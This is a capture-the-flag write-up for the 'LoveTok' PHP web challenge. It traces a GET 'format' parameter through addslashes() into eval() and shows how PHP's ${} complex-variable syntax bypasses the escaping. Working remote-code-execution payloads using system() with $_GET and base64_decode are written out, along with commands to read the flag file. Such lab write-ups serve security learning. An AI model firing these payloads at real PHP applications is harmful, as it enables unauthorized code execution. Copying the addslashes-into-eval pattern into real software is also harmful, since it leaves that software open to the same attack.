# LoveTok

## Enumeration

For this challenge, we are provided with the source code of the web application. It is a PHP based application which seemed to have time notations, countdown functionality etc. Looking at the website, it looks to have a large button which sends a GET request with the following parameter and value: `?format=r`

Looking at the `TimeController.php` file, we see what is happening behind the scenes:

```php
public function index($router)
{
    $format = isset($_GET['format']) ? $_GET['format'] : 'r';
    $time = new TimeModel($format);
    return $router->view('index', ['time' => $time->getTime()]);
}
```

The `format` parameter is set to the value `r` if not specifically set and the value is then passed to the `TimeModel.php` file. It then calls the `getTime()` function.

Looking at the `TimeModel.php` file we not only see what `getTime()` is but we also see our vulnerability:

```php
public function __construct($format)
{
    $this->format = addslashes($format);
...


public function getTime()
{
    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
...
```

Here we see that `format` is being sent through a function called `addslashes()`. We also see that `getTime` has an `eval()` function being called (`format` is also going though this function) which is how we can perform RCE (Remote Code Execution).

However, there is one problem. The `addslashes()` function is used to escape the following characters:
1. single quote (')
2. double quote (")
3. backslash (\)
4. NULL BYTE

So clearly we can't just make a payload like `");system("ls /")//` and call it a day because the double quotes simply get commented out. While reading the documentation for this function, I saw how this function shouldn't be used to prevent SQL injections, which made me wonder if there was any way to bypass this.

## Exploit

While googling, I came across this article: https://www.programmersought.com/article/30723400042/

TLDR: `${}` is a way to write complex variables in PHP, which can also be used with functions in order to use their return values as variables. When we think about this, if a function is being executed, then thats all we really need. Even if it is a blind execution, all we need is 1 `system()` function to be executed. 

We can test our payload like this:
```url
/?format=${phpinfo()}
```

This payload executes the `phpinfo()` function and allows us to see the php information of this web application. 

From here, there are 2 ways that you can proceed with the exploit:

### $_GET Method:

In this method, your payload will look like this:

```url
/?format=${system($_GET[1])}&1=ls
```

In this payload, because quotes get removed from our payload, we can use `$_GET` to store our payload and execute all payloads without any inconvenience.

### base64_decode() Method:

I discovered this method while looking through other ways of bypassing `addslashes()`. Since we can't URL-encode our payload (because `$_GET` decodes it before getting processed) I thought that we could use base64 encoding instead and be able to just call the `base64_decode()` function. Here is how our payload will look:

```url
/?format=${system(base64_decode(bHMK))}
```

The problem with this method is that we have to encode every payload of ours before sending it through AND you will have to escape any quote marks in the payload before sending it.

## Flag

The flag filename is different for every instance, but it is available in the root directory so your payloads (encoded or not) will just require you to do the following:

```vim
ls /

cat /flagXXXXxxx
```
